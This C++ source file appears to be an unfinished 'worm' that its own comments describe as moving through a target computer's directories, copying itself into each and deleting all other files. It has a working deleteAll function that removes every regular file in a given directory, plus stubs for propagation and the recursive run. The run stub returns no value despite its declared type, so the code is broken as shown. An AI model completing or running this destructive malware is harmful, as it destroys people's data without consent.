#include <filesystem>
#include <iostream>
#include <fstream>
#include <vector>
#include "dir-hist.h"

DirectoryHistory dirhist;
std::string first_origin = std::filesystem::current_path();
std::string file_path = first_origin + "/worm";

// This function is responsible to enumerate the sub directories
// inside the path variable passed
std::vector<std::string> checkSubDir(const std::string &path) {
    // Declare sub_dirs vector variable
    std::vector<std::string> sub_dirs;

    // Loops through all entries inside the passed variable path
    for(const auto &entry : std::filesystem::directory_iterator(path)) {
        // checks if the entry is a directory
        // If true, append it to the vector sub_dirs
        if (entry.is_directory()) {
            std::string sub = entry.path().filename().string();
            sub_dirs.push_back(sub);
        }
    }

    return sub_dirs;
}

// This function is responsible to look to all files inside
// a directory path and delete them all
void deleteAll(std::string path) {
    // Loops through all entries inside the passed variable path
    for (const auto &entry : std::filesystem::directory_iterator(path)) {
        // checks if the entry is a regular file
        // If true, deletes it
        if (std::filesystem::is_regular_file(entry)) {
            std::filesystem::remove(entry);
        }
    }
}

// This function is responsible to copy the worm executable
// file into the destination path
void propagate(std::string destination) {
    return;
}

// This function is responsible to recursively navigate through all
// directories in the target computer, copying the worm malware and deleting
// all other files in it
std::filesystem::path run(std::filesystem::path origin, std::vector<std::string> sub_dirs) {
    return;
}

int main() {
    return 0;
}


